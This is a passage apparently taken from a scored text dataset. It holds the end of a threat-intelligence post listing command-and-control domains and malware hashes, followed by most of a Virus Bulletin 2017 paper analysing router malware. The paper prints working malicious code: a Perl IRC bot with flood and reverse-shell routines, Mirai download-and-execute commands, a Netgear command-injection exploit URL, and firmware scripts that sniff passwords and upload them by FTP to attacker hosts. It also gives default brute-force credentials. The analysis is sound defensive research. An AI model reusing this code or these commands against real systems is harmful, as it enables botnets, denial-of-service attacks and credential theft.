Responding to the same IP are also the following malicious command and control servers:
dentistbook.info
indianfirends.com
indianpolitics.com
insomniacporeed.ru
More malicious URLs are known to have responded to the the same IP in the past, for instance:
hxxp://outsourcingtoindiablog.com/look.html
hxxp://outsourcingtoindiablog.com/top.html
hxxp://outsourcingtoindiablog.com/stream.html
hxxp://indianfirends.com/main.php?s=homepage.index
hxxp://indianpolitics.org/main.php?s=homepage.index&ss=5
hxxp://sabdekho.com/signal.html
More MD5s are known to have phoned back to the same IP in the past, for instance: MD5: 97974153c25baf5826bf441a8ab187a6 – detected by 16 out of 42 antivirus scanners as Trojan.Win32.Jorik.Zbot.fxq; Gen:Variant.Zusy.17989, and MD5: 9069210d0758b34d8ef8679f712b48aa – detected by 6 out of 42 antivirus scanners as Trojan.Winlock.6049; W32/Cridex.R
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.011753157663293656
VB2017 paper: The router of all evil: more than just default passwords and silly scripts,0.008243904733378105
Himanshu Anand & Chastine Menrige,0.012014657765652359
"Symantec, India",0.00920163334663826
Copyright © 2017 Virus Bulletin,0.01004035859515584
"Table of contents
Abstract Introduction Strategic importance of routers in the network How routers can be infected Why routers are infected Types of malware associated with routers Scripts Compiled Firmware The exploit Content of bash script Analysis of firmware What is it uploading? Notable router attacks Hacking Team takedown The tool: Firmadyne References",0.011599900443280298
Abstract,0.009485057568311417
"In the last couple of years, we have seen a few highly sophisticated router attacks and pieces of malware, the most famous of which are the Cisco exploit (CVE-2016-6366), which was found among one of the data dumps by the Shadow Brokers hacking group in 2016, and the zero-day exploit in networking devices that took down the Italian Hacking Team in 2015.",0.01394454867092132
"While researching router exploits and malware, we came across some very interesting examples of router malware and malicious firmware. This paper looks at two case studies:",0.01629213940906693
"The
Netgear
router attack involving the Multiple Netgear Routers Remote Command Injection Vulnerability (CVE-2016-6277) [
1
] and malicious firmware associated with it, which was flashed remotely, as well as the use of the Firmware Mod Kit (FMK) for the development of malicious firmware.",0.007304347577685277
"The ShellShock vulnerability (CVE-2014-6271) and related vulnerabilities (CVE-2014-6277 [
2
], CVE‑2014‑6278 [
3
], CVE-2014-7169 [
4
], CVE‑2014‑7186 [
5
], and CVE-2014-7187 [
6
]), which were used to compromise routers and infect them with .ELF malware, as well as infect them using Perl-based IRC bots.",0.010879542670971798
"Finally, this paper discusses the objectives of Internet of Things (IoT) malware, which are primarily associated with distributed denial of service (DDoS) attacks and information stealers. A few such attacks have involved man-in-the-middle (MitM) threats and Domain Name System (DNS) changers. Moreover, this paper discusses how attackers exploit networks, what the future of router exploits holds, and how such attacks could be very dangerous for both corporate and home users.",0.011065853837756157
Introduction,0.012036720276026314
"Routers are networking devices that serve as the gateway for both home and corporate networks, from Internet of Things (IoT) devices to computers over which people carry out banking or other important and confidential activities. Having control of this gateway gives attackers access to all the computers and/or devices in the network, as well as all the data passing through it.",0.01307315913339302
"This is a prime reason why home routers are a new frontier for cybercriminals and could prove to be one of the biggest attack vectors. Attacks involving compromised routers have been around for a long time. In 2007, attackers exploited a vulnerability to change the DNS settings of more than 4.5 million DSL modems in Brazil. In March 2014, Team Cymru reported that over 300,000 home routers had been compromised and had had their DNS settings changed in an attack campaign [7]. In September 2014, there was another huge attack on routers across Brazil [8].",0.013245509313240977
These attacks mostly exploit two vulnerabilities:,0.00768039533451792
Cross-Site Request Forgery (CSRF),0.018797239797917586
Default passwords,0.008864864760067537
"An attack occurred in 2007 [9] in which a proof-of-concept (PoC) code against home routers was published. This attack was possible and proved successful because default router passwords could easily be guessed. Cisco acknowledged that 77 of its routers had been vulnerable to CSRF [10]. The problem of default passwords is still serious in today's threat landscape. This was apparent in attacks involving the infamous Mirai botnet, which attackers leveraged to infect hundreds of thousands of IoT devices that were subsequently used for further attacks [11].",0.011847778838736334
Strategic importance of routers in the network,0.00918652035969092
The strategic placement of routers in the network incorporates elements of dependability in order to detect and correct errors in data packets. The router performs two main functions:,0.012734158247214022
"Control path routing:
The routing process usually directs forwarding on the basis of routing tables, which maintain a record of the routes to various network destinations. Thus, the construction of routing tables, which are held in the router's memory, is very important for efficient routing. Most routing algorithms use only one network path at a time. Multi-path routing techniques enable the use of multiple alternative paths.",0.021877713837328394
"Data path control (switching):
Networking tries to solve the specific needs of storage networks by changing the communication paths. 'Connection failure' messages mean the connection retired. Error recovery in minutes is acceptable for message networks; for storage networks, it should be within seconds, preferably milliseconds. Because of these differences, storage network routing must include redundant, well-defined paths, enable fast path changes, and update the altered topology information rapidly.",0.016343737311534046
Figure 1: Placement of the router in the network.,0.017027212693371596
"As shown in Figure 2, all the traffic comes in via input ports, goes inside the router to perform some switching and routing processing, before going out via output ports.",0.014362716870284342
Figure 2: Architecture of a router.,0.014971608980947071
How routers can be infected,0.009231307742111783
Routers play an important role in the exchange of information within the network. Controlling a router gives the attacker access to the affected computers and/or devices and the data that passes through them.,0.01645039492467848
The following are some types of attacks that can be used in infecting routers:,0.008257060492155577
"Default password-based attack:
Home routers are often designed to be plugged in and forgotten about after a very basic set-up. Often, users do not bother to configure their own settings and just go with the default ones. Most users do not mind using the default passwords since some router manufacturers provide unique admin passwords that are printed on permanent stickers along with other details like the model and MAC address. Some ISPs also lease routers with default passwords and forbid users from changing them.
Many attackers are aware of such practices so they pre-program their malware to make use of commonly used or default passwords [
12
]. They can also mount a brute-force attack and attempt to guess the password using a dictionary of words. This attack could take a short period of time if the password is considerably weak.
Attacks on
Symantec
's honeypot revealed the most common passwords used by IoT malware in attempting to log into devices, as shown in
Table 1
. The most up-to-date default password database can be found at http://www.routerpasswords.com/.",0.01374935814438305
Top usernames,0.010215855130543017
Top passwords,0.010213986219865245
root,0.011190211677799877
admin,0.007765596970426114
admin,0.007765596970426114
root,0.011190211677799877
DUP root,0.006612699020384416
123456,0.011442413500507564
ubnt,0.0077848700911857804
12345,0.008003571580395774
access,0.008540517231344191
ubnt,0.0077848700911857804
DUP admin,0.006695562527606391
password,0.011473118031891993
test,0.010325613816517532
1234,0.010834561859387803
oracle,0.009983595628792807
test,0.010325613816517532
postgres,0.008759992431589092
qwerty,0.010864528746487911
pi,0.008500594786907012
raspberry,0.014416326097435261
"Table 1: Top 10 brute-force usernames and passwords used against IoT devices [
13
].",0.012164226091745833
"Exploits
ShellShock and other router-specific exploits.",0.013282812609369143
"Firmware backdoor directly from vendor
Vendors put in a backdoor and supply it to users.",0.01145148438068977
Why routers are infected,0.00966653565762543
"Once attackers gain access to a router, they can change DNS settings and gain control over data passing through the network. Intercepted data can be leveraged to deploy malware, display ads, or perform phishing attacks on the computers within the same network.",0.01749866894848795
"Performing DDoS attacks:
Attackers hijack devices to add them to a botnet. Most of these botnets are used to perform distributed denial of service (DDoS) attacks on other, more valuable victims. The attacker uses scripts on the routers to launch such an attack. When triggered, potentially thousands of routers can send packets to the targeted victim all at the same time, overpowering the victim's resources and impacting its services and business.
In September 2016,
Sucuri
identified a massive DDoS attack launched from three different types of botnets, including home router botnets [
14
]. This attack is considered the biggest case of infected routers to date.",0.018020188827006955
"Harvesting credentials:
In recent attacks, we found that as routers gained control of all the network traffic, attackers would harvest credentials from computers within the network.",0.01396673457699471
"Spying:
Multiple router exploits were found in a recent dump by the Shadow Brokers. This underlines how powerful attackers can effectively use routers for spying on the whole network, and not only on each specific endpoint.",0.011906348851420723
Types of malware associated with routers,0.006660171161787298
Scripts,0.0076609234017185335
"In 2014, attackers took advantage of the GNU Bash Remote Code Execution Vulnerability (CVE-2014-6271) [14], also known as Bash Bug or ShellShock, as well as its related vulnerabilities (CVE-2014-6277 [2], CVE-2014-6278 [3], CVE-2014-7169 [4], CVE-2014-7186 [5], and CVE-2014-7187 [6]), to compromise routers and infect them using Perl-based IRC bots [16] (see Figure 3).",0.014629977460919763
"#!/usr/bin/perl
#-shell @ddos
#-shell @commands
#-shell @irc
############################################
my $processo = 'usr/sbin/httpd';
my $linas_max='10';
my $sleep='5';
my $cmd="""";
my $id="""";
############################################
my @adms=(""Asap"", ""Viz"");
my @canais=(""#buttholes"");
my $chanpass = """";
$num = int rand(99999);
my $nick = ""[L]"" . $num . """";
my $ircname ='[L]';
chop (my $realname = '[L]');
$servidor='23.95.43.182' unless $servidor;
my $porta='8080';
############################################",0.016024153684748743
Figure 3: Code snippet of a Perl-based IRC bot.,0.019481297547426557
"The said bots can perform a DDoS attack when triggered by sending a UDP, SYN, or HTTP flood (Figure 4).",0.030928831487742392
"#####################
#     UDPFlood       #
######################
if ($funcarg =~ /^udp\s+(.*)\s+(\d+)\s+(\d+)/) {
sendraw($IRC_cur_socket, ""PRIVMSG $printl : 13[
[email protected]
3UDP-DDOS 13] Attacking 4 "".$1."":"".$2."" 13for 4 "".$3."" 13seconds."");
$iaddr = inet_aton(""$1"") or die ""Fuck wrong ip"";
$endtime = time() + ($3 ? $3 : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);
$port = ""80"";
for (;time() <= $endtime;) {
$2 = $2 ? $2 : int(rand(1024-64)+64) ;
$port = $port ? $port : int(rand(65500))+1;
send(flood, pack(""a$psize"",""flood""), 0, pack_sockaddr_in($2, $iaddr));}
sendraw($IRC_cur_socket,""PRIVMSG $printl : 13[
[email protected]
3UDP-DDOS 13] Attack done 4 "".$1."":"".$2.""."");
}
######################
#     TCPFlood       #
######################",0.01194769158482345
"if ($funcarg =~ /^tcpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
sendraw($IRC_cur_socket, ""PRIVMSG $printl : 12[
[email protected]
3TCP-DDOS 12] Attacking 4 "".$1."":"".$2."" 12for 4 "".$3."" 12seconds."");
my $itime = time;
my ($cur_time);
$cur_time = time - $itime;
while ($3>$cur_time){
$cur_time = time - $itime;
&tcpflooder(""$1"",""$2"",""$3"");
}
sendraw($IRC_cur_socket,""PRIVMSG $printl : 12[
[email protected]
3TCP-DDOS 12] Attack done 4 "".$1."":"".$2.""."");
}
######################
#  End of TCPFlood   #
######################",0.011222046558151733
Figure 4: Code snippet of a DDoS attack routine.,0.019872973755710954
"The bot is also capable of a back-connect shell, also known as reverse shell, to communicate back to the command-and-control (C&C) server, instead of just opening a port and listening for a remote attacker to connect (Figure 5).",0.01835848216669622
"######################
#   Back Connect     #",0.00858149362085836
"######################
if ($funcarg =~ /^back\s+(.*)\s+(\d+)/) {
sendraw($IRC_cur_socket, ""PRIVMSG $printl : 12[
[email protected]
3Back-Connect 12]:::...  I don't know, I'm watching a show tho"");",0.012046787172438234
"}
if ($funcarg =~ /^shhcon\s+(.*)\s+(\d+)/) {
my $host = ""$1"";
my $porta = ""$2"";
my $proto = getprotobyname('tcp');
my $iaddr = inet_aton($host);
my $paddr = sockaddr_in($porta, $iaddr);
my $shell = ""/bin/sh -i"";
if ($^O eq ""MSWin32"") {
$shell = "" cmd.exe"";
}
socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die ""socket: $!"";
connect(SOCKET, $paddr) or die ""connect: $!"";
open(STDIN, "">&SOCKET"");
open(STDOUT, "">&SOCKET"");
open(STDERR, "">&SOCKET"");
system(""$shell"");
close(STDIN);
close(STDOUT);
close(STDERR);
if ($estatisticas){
sendraw($IRC_cur_socket, ""PRIVMSG $printl : 12[
[email protected]
3Back-Connect 12] Connecting to 4 $host:$porta"");
}
}
######################
#End of  Back Connect#
######################",0.017946934847758
Figure 5: Code snippet of a back-connect shell routine.,0.013245902856683922
The bot also has features like port scanning and checks if a port from the list is open (Figure 6).,0.01882872295239113
"######################
#      Portscan      #
######################",0.00915878488327082
"if ($funcarg =~ /^portscan (.*)/) {
my $hostip=""$1"";
@portas=(""15"",""19"",""98"",""20"",""21"",""22"",""23"",""25"",""37"",""39"",""42"",""43"",""49"",""53"",""63"",""69"",""79"",
""80"",""101"",""106"",""107"",""109"",""110"",""111"",""113"",""115"",""117"",""119"",""135"",""137"",""139"",""143"",""174"",""194"",""389"",
""389"",""427"",""443"",""444"",""445"",""464"",""488"",""512"",""513"",""514"",""520"",""540"",""546"",""548"",""565"",""609"",""631"",""636"",
""694"",""749"",""750"",""767"",""774"",""783"",""808"",""902"",""988"",""993"",""994"",""995"",""1005"",""1025"",""1033"",""1066"",""1079"",
""1080"",""1109"",""1433"",""1434"",""1512"",""2049"",""2105"",""2432"",""2583"",""3128"",""3306"",""4321"",""5000"",""5222"",""5223"",
""5269"",""5555"",""6660"",""6661"",""6662"",""6663"",""6665"",""6666"",""6667"",""6668"",""6669"",""7000"",""7001"",""7741"",""8000"",
""8018"",""8080"",""8200"",""10000"",""19150"",""27374"",""31310"",""33133"",""33733"",""55555"");
my (@aberta, %porta_banner);
sendraw($IRC_cur_socket, ""PRIVMSG $printl : 12[
[email protected]
3Port-Scanner 12] Scanning for open ports on "".$1."" 12 started ."");
foreach my $porta (@portas)  {
my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $porta, Proto =>
'tcp', Timeout => 4);
if ($scansock) {
push (@aberta, $porta);
$scansock->close;
}
}",0.016707114017504354
"if (@aberta) {
sendraw($IRC_cur_socket, ""PRIVMSG $printl : 12[
[email protected]
3Port-Scanner 12] Open ports founded: @aberta"");
} else {
sendraw($IRC_cur_socket, ""PRIVMSG $printl : 12[
[email protected]
3Port-Scanner 12] No open ports foundend."");
}
}",0.011475148676902358
"######################
#  End of  Portscan  #
#####################",0.010624145632195048
Figure 6: Code snippet of a port scanning routine.,0.01778298492180208
Compiled,0.008756983719692801
Mirai (Linux.Gafgyt) [17] is an infamous worm that took advantage of routers' default passwords in late 2016 [18]. The most common type found downloaded malware compiled for multiple platforms and then tried to execute them (Figure 7).,0.010198044533898942
"#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/sshd; chmod +x sshd; ./sshd; rm -rf sshd
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/openssh; chmod +x openssh; ./openssh; rm -rf openssh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/bash; chmod +x bash; ./bash; rm -rf bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/tftp; chmod +x tftp; ./tftp; rm -rf tftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/wget; chmod +x wget; ./wget; rm -rf wget
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/cron; chmod +x cron; ./cron; rm -rf cron
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/ftp; chmod +x ftp; ./ftp; rm -rf ftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/pftp; chmod +x pftp; ./pftp; rm -rf pftp
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/sh; chmod +x sh; ./sh; rm -rf sh
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/' '; chmod +x ' '; ./' '; rm -rf ' '
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/apache2; chmod +x apache2; ./apache2; rm -rf apache2
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://179.43.146.30/telnetd; chmod +x telnetd; ./telnetd; rm -rf telnetd",0.03500230568440221
Figure 7: Code snippet of Mirai worm.,0.019659418336470336
Firmware,0.0067296563625784955
"Attackers were found flashing Netgear home routers remotely using the Multiple Netgear Routers Remote Command Injection Vulnerability (CVE-2016-6277) [1], which allowed an unauthenticated user to inject commands into HTTP requests that were then executed on the device.",0.007300390094987175
http:// [Victime]:8080/cgi-bin/;nvram$IFS\set$IFS\http_passwd;nvram$IFS\set$IFS\http_username;nvram$IFS\commit;sleep$IFS\2;cd$IFS\/tmp;wget$IFS\http:\/\/[attacker controlled server]\/h\/wrt\/uge.sh;chmod$IFS\777$IFS\/tmp/uge.sh;/bin/sh$IFS\/tmp/uge.sh,0.012119238044851266
The exploit,0.006111878908545476
The exploit consists of the following steps:,0.007474424851677708
Downloading shell script from http://[ATTACKER-CONTROLLED SERVER]/h/wrt/uge.sh.,0.0104575023661585
Changing the shell script's access permission to 777.,0.011515327440309364
Executing the bash script.,0.015317910211084418
Content of bash script,0.007509822217118267
"The shell script (shown in Figure 8) checks whether /tmp/check112 already exists, and that the size is not 0.",0.00931613841736989
"Getting to the end of the shell script reveals that it downloads a bin file from http://94.156.35.78/h/wrt/112.bin. After downloading the file, the shell script executes a 'write' command on the downloaded file. For example:",0.012704834535513632
write 112.bin linux,0.007877034930232951
"#!/bin/sh
if [[ -s /tmp/check112 ]]; then
uptime
#echo>/tmp/check98
#killall -HUP dnsmasq
#nvram set dnsmasq_enable=1
#nvram set local_dns=0
#nvram set dnsmasq_options=
#nvram commit
#/sbin/reboot
#cd /tmp
#/usr/bin/wput h5.sh ftp://root:
[email protected]
/mnt/hdd/backup/ok/ &
#process_id=$!
#wait process_id
else
echo>/tmp/check112
cd /tmp
#nvram set dnsmasq_enable=1
#nvram set local_dns=0
#nvram set dnsmasq_options=
#nvram commit
#echo 'sdsffsdfsdffffffffffffff'>/tmp/check8
echo ""sleep 420;/sbin/reboot"">/tmp/ar.sh
chmod 777 /tmp/ar.sh
/bin/sh /tmp/ar.sh &
#nvram set rc_startup=
#nvram commit
sleep 2
#rm -rf /tmp/ds2;rm -rf /tmp/ds;rm -rf 2.sh;rm -rf 3.sh;rm -rf 4.sh;rm -rf arp;rm -rf arp1.sh;rm -rf arp2.sh;rm -rf df;rm -rf ds;rm -rf ds1.sh;rm -rf ds10.txt;rm -rf ds2.sh;rm -rf ds3.sh;rm -rf ds4.sh;rm -rf dyn1.sh;rm -rf dyn2.sh;rm -rf h5.sh;rm -rf i5.sh;rm -rf inadyn1.conf;rm -rf lp;rm -rf lp.sh;rm -rf lp1.sh;rm -rf lp2;rm -rf lp2.sh;rm -rf lp8.txt;rm -rf nv;rm -rf nvr1.sh;rm -rf nvr2.sh;rm -rf ovpn.sh;rm -rf ovpn1.sh;rm -rf ovpn2.sh;rm -rf remo1.sh;rm -rf remo2.sh;rm -rf remo4;rm -rf sf;rm -rf uname;rm -rf uname1.sh;rm -rf uname2.sh;rm -rf vpn.sh;rm -rf vpn1.sh;rm -rf vpn2.sh;rm -rf vr;rm -rf vr.sh;rm -rf vr1.sh;rm -rf vr2.sh;rm -rf vr8.txt;rm -rf /tmp/bin/wput;rm -rf /tmp/usr/lib/*;rm -rf /tmp/usr/sbin/*
#cd /tmp
##!!!!!! wget http://178.57.115.231:8081/h/wrt/custom_image_00021.bin &
wget http://94.156.35.78/h/wrt/112.bin &
process_id=$!
wait $process_id
write 112.bin linux
/sbin/reboot
Fi",0.023293650086906537
"Figure 8: This shell script checks whether /tmp/check112 already exists, and that the size is not 0.",0.0074426512399741185
Analysis of firmware,0.008675351650043184
"The 112.bin file is custom firmware that is built to replace the firmware currently running on the router. This process is called 'flashing' and is what the 'write' command is doing. To understand more about the file, we tried to unpack it. Gathering information on the firmware revealed that it is a TRX firmware, as shown in Table 2.",0.013321238549744985
Decimal,0.010528683898061164
Hexadecimal,0.009260987668379683
Description,0.014276898542484706
0,0.00817816293997986
0x0,0.008398456016373568
"TRX firmware header, little-endian, image size: 608,576 bytes, CRC32: 0x1F69B1FF, flags: 0x0, version: 1, header size: 28 bytes, loader offset: 0x1C, Linux kernel offset: 0x9A8, rootfs offset: 0xE4C00",0.0138427599274632
28,0.013651863461406122
0x1C,0.008127264520374378
"Gzip compressed data, maximum compression, from Unix, NULL date (1970-01-01 00:00:00)",0.01464415963096044
2472,0.008754821519170619
0x9A8,0.007820818738869417
"LZMA compressed data, properties: 0x6E, dictionary size: 2,097,152 bytes, uncompressed size: 2,990,080 bytes",0.011319686235993442
936960,0.008190597910522901
0xE4C00,0.008928485798986308
"Squashfs filesystem, little‑endian, DD-WRT signature, version 3.0, size: 2,668,434 bytes, 580 inodes, blocksize: 131,072 bytes, created: 2016-11-09 07:00:35",0.014057324186006248
Table 2: Information on 112.bin firmware.,0.01045690122010312
"There was also a giveaway from the magic bytes of the file when loaded into a hex editor, as shown in Figure 9.",0.01017745304556561
Figure 9: Magic bytes.,0.014019345436373176
"Proceeding to extract the file system revealed folders inside the firmware, as shown in Figure 10.",0.010380426863543901
Figure 10: Folders inside the firmware.,0.014426298141022142
"Looking at the directory tree, one particular file stood out: /etc/init.d/rcS. Running the 'file' command on the file reveals that it is a POSIX shell script, ASCII text executable. This file (bash file) is called during boot time and runs whatever is put into it. Figure 11 shows the content of the rcS file.",0.015293065498028446
"#!/bin/sh
sleep 320
echo ""while true
do
ping -c 3 8.8.8.8 > /dev/null
if [ 0 -eq 1 ]; then
echo is ofline.09-11-09-01 > /dev/null
else
cd /tmp
rm -rf /tmp/d1.sh
echo>/tmp/check112
rm -rf /tmp/start_mod.sh
wget http://94.156.35.78/h/wrt/start_mod.sh
chmod 777 /tmp/start_mod.sh
/bin/sh /tmp/start_mod.sh &
sleep 360
rm -rf /tmp/l2.sh;cd /tmp;wget http://dasadlxx49.hopto.org/tmp/l2.sh;chmod 777 /tmp/l2.sh;/bin/sh /tmp/l2.sh &
rm -rf /tmp/hall49bb.sh;cd /tmp;wget http://bikershop-bittner.de/tmp/hall49bb.sh;chmod 777 /tmp/hall49bb.sh;/bin/sh /tmp/hall49bb.sh &
rm -rf /tmp/hall2.sh;cd /tmp;wget http://dasadgxx4744.hopto.org/tmp/hall2.sh;chmod 777 /tmp/hall2.sh;/bin/sh /tmp/hall2.sh &
rm -rf /tmp/hall1bb.sh;cd /tmp;wget http://bb1d7gsak.hopto.org/tmp/hall1bb.sh;chmod 777 /tmp/hall1bb.sh;/bin/sh /tmp/hall1bb.sh &
rm -rf /tmp/hall2bb.sh;cd /tmp;wget http://bb49d7dns.ddns.net/tmp/hall2bb.sh;chmod 777 /tmp/hall2bb.sh;/bin/sh /tmp/hall2bb.sh &
rm -rf /tmp/hall2bb.sh;cd /tmp;wget http://bba27kda.ddns.net/tmp/hall2bb.sh;chmod 777 /tmp/hall2bb.sh;/bin/sh /tmp/hall2bb.sh &
setuserpasswd root glissada88
sleep 7200
fi
done
sleep 1
done
"" > /tmp/2.sh
chmod 777 /tmp/2.sh
/bin/sh /tmp/2.sh &
sleep 20
chmod 777 -R /tmp
mkdir /tmp/ip2;cd /tmp/ip2;wget http://94.156.35.78/h/wrt/ip.php;cat /tmp/ip2/ip.php>/tmp/i5.sh;rm -rf /tmp/ip2
rm -rf /tmp/index.html;cd /tmp;/usr/bin/wget http://www.ip2nation.com;cat /tmp/index.html | grep acronym | sed 's/<acronym title=""IP: //g' | sed -n 's/.*"">//p' | sed 's/<\/acronym>//g' | sed 's/ //g'>/tmp/h5.sh;rm -rf /tmp/index.html
cd /tmp;rm -rf /tmp/ds_mod.sh;wget http://94.156.35.78/h/wrt/ds_mod.sh;chmod 777 /tmp/ds_mod.sh;/bin/sh /tmp/ds_mod.sh &
rm -rf /tmp/start_hall.sh;cd /tmp;wget http://salem132.dyndns.tv/tmp/start_hall.sh;chmod 777 /tmp/start_hall.sh;/bin/sh /tmp/start_hall.sh &
rm -rf /tmp/hall883bb.sh;cd /tmp;wget http://bikershop-bittner.de/tmp/hall883bb.sh;chmod 777 /tmp/hall883bb.sh;/bin/sh /tmp/hall883bb.sh &
for i in /etc/init.d/S*; do
$i start 2>&1
done | logger -s -p 6 -t '' &",0.020579000771467126
Figure 11: Content of rcS file.,0.012471497976443424
"When executed, the script removes the previous versions of the malicious files downloaded from the servers and downloads newer ones. We were not able to download all the files since most of the servers were down, but one of the downloaded files, http://94.156.35.78/h/wrt/ds_mod.sh, revealed something interesting (see Figure 12).",0.015513426043093914
"if [[ -s /tmp/ds10_mod.txt ]]; then
rm -rf /tmp/ds/ds1.txt
uptime > /dev/null
else
echo ""while true
do
ping -c 3 8.8.8.8 > /dev/null
if [ 0 -eq 1 ]; then
echo is ofline.09-11-09-01 > /dev/null
else
if [[ -s /tmp/ds11.txt ]]; then
uptime > /dev/null
else
echo \""sdasdsadasdsadsadasdasdasdasd\"">/tmp/ds10_mod.txt
#echo \""sdasdsadaddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddsdsadsadasdasdasdasd\"">/tmp/ds11.txt
mkdir /tmp/ds
touch /tmp/ds/ds.)cat /tmp/i5.sh).txt
#/usr/sbin/dsniff -i )nvram get wan_iface) >/tmp/ds/ds5.txt &
/usr/sbin/dsniff -i )nvram get lan_ifname) >/tmp/ds/ds5.txt &
#/usr/sbin/dsniff -i )nvram get wan_iface) >/tmp/ds/ds5.txt &
sleep 120
kill \$!
rm -rf /var/run/ms
killall ms
#mv /tmp/ds/ds5.txt /tmp/ds/ds7.txt
cat /tmp/ds/ds5.txt >>/tmp/ds/ds.)cat /tmp/i5.sh).txt
sleep 1
cd /tmp/ds
if [ )ls -l /tmp/ds/ds.\)cat /tmp/i5.sh\).txt | awk '{print \$5}') -gt 5000 ]; then
mkdir /tmp/ds2
cp /tmp/ds/ds.)cat /tmp/i5.sh).txt /tmp/ds2/
mv /tmp/ds2/ds.)cat /tmp/i5.sh).txt /tmp/ds2/)cat /tmp/h5.sh | cut -c 1-4).)date +%H-%M-%d-%m-%y)_)cat /tmp/i5.sh).txt
cd /tmp/ds2
/usr/bin/wput )cat /tmp/h5.sh | cut -c 1-4).)date +%H-%M-%d-%m-%y)_)cat /tmp/i5.sh).txt ftp://sammy:
[email protected]
/mnt/hdd/backup/ds/ &
process_id=\$!
wait \$process_id
fi
if [ )ls -l /tmp/ds/ds.\)cat /tmp/i5.sh\).txt | awk '{print \$5}') -gt 5000 ]; then
rm -rf /tmp/ds/*
rm -rf /tmp/ds2/*
fi
fi
fi
done
sleep 1
done
"" > /tmp/ds1_mod.sh
sed 's/)/'/g' </tmp/ds1_mod.sh >/tmp/ds2_mod.sh.sh
sed 's/,/(/g' </tmp/ds2_mod.sh.sh >/tmp/ds3_mod.sh.sh
sed 's/Z/)/g' </tmp/ds3_mod.sh.sh >/tmp/ds4_mod.sh.sh
chmod 777 /tmp/ds4_mod.sh.sh
sleep 2
/bin/sh /tmp/ds4_mod.sh.sh &
Fi",0.021896719970237455
Figure 12: Downloaded file from http://94.156.35.78/h/wrt/ds_mod.sh.,0.01158730106997885
The script had an interesting command:,0.0083685415277297
"/usr/bin/wput 'cat /tmp/h5.sh | cut -c 1-4'.'date +%H-%M-%d-%m-%y'_'cat /tmp/i5.sh'.txt ftp://sammy:
[email protected]
/mnt/hdd/backup/ds/ &",0.01210149629793067
It appeared as if the command was uploading some text file to the FTP server with the filename formatted in the following way:,0.0062567216561655314
<COUNTRY'S FIRST FOUR LETTERS>.<DATE IN DD MM YY>.<IP ADDRESS OF THE DEVICE>.txt,0.008783801857371043
The text file was uploaded to the following FTP server:,0.006079563404259303
ftp://94.156.35.78/mnt/hdd/backup/ds/,0.010474455117354786
The country's first four letters were fetched from http://www.ip2nation.com (script /tmp/h5.sh).,0.013552175580299863
The IP address was fetched from http://94.156.35.78/h/wrt/ip.php (script /tmp/i5.sh).,0.008758833300057223
What is it uploading?,0.011170449433692053
Another mystery is: what was the data being uploaded? Further analysis revealed that the custom firmware had the password-sniffing tool dsniff [19] installed within it. The dsniff process is started during boot time with the rcS script:,0.011894905816183132
/usr/sbin/dsniff -i )nvram get lan_ifname) >/tmp/ds/ds5.txt,0.011100052290751061
The tool is configured to sniff passwords and push them to a text file. This file is what was later uploaded to the FTP server.,0.008933084118857404
"Looking into the FTP revealed multiple text files, indicating that the attack was very widespread (see Figure 13).",0.022655818292364627
Figure 13: Multiple text files in the FTP server.,0.012146690735737486
Notable router attacks,0.0078210865046906
Hacking Team takedown,0.010531514853916013
"Offensive security company Hacking Team previously had very little exposure on the Internet. For example, unlike the Gamma Group, a client certificate was required in order to connect to Hacking Team's customer support site. The company did have its main website (a Joomla blog in which Joomscan did not find anything serious), a mail server, a couple of routers, two VPN appliances, and a spam‑filtering appliance.",0.010441433395460886
"So, there were three options: look for a zero-day in Joomla, postfix, or one of the embedded devices. A zero-day in an embedded device seemed like the easiest option, and after two weeks of reverse engineering, they got a remote root exploit [20].",0.011280586757910216
Shadow Brokers [21],0.011905969035681085
Figure 14 shows router exploits by the Shadow Brokers.,0.016447127778127735
Figure 14: Router exploits by the Shadow Brokers (source: https://blogs.cisco.com/security/shadow-brokers).,0.021487833731134054
The tool: Firmadyne,0.007978066237095294
Firmadyne is an automated and scalable system for performing emulation and dynamic analysis of Linux-based embedded firmware [22]. It includes the following components:,0.014558145227311803
"Modified kernels (MIPS: v2.6.32 [
23
], ARM: v4.1 [
24
], v3.10 [
25
]) for instrumentation of firmware execution.",0.015290508506689227
"A userspace NVRAM library [
26
] to emulate a hardware NVRAM peripheral.",0.012365931954337328
"An extractor [
27
] to extract a file system and kernel from downloaded firmware.",0.010997890293544255
"A small console application [
28
] to spawn an additional shell for debugging.",0.010869620203376007
"A scraper [
29
] to download firmware from 42+ different vendors.",0.011195644541511784
"Firmadyne can also be used to repack any binary, after altering the files in a file system. And that is what was done in the case of the firmware we have discussed in this paper.",0.008689225334732487
References,0.0158494738281566
[1] http://www.securityfocus.com/bid/94819.,0.009029826929082274
[2] http://www.securityfocus.com/bid/70165.,0.009319168794949206
[3] http://www.securityfocus.com/bid/70166.,0.00910837737639203
[4] http://www.securityfocus.com/bid/70137.,0.008921971636631443
[5] http://www.securityfocus.com/bid/70152.,0.008813413091179334
[6] http://www.securityfocus.com/bid/70154.,0.00877893462191226
[7] http://www.pcworld.com/article/2104380/attack-campaign-compromises-300000-home-routers-alters-dns-settings.html.,0.01232443085164514
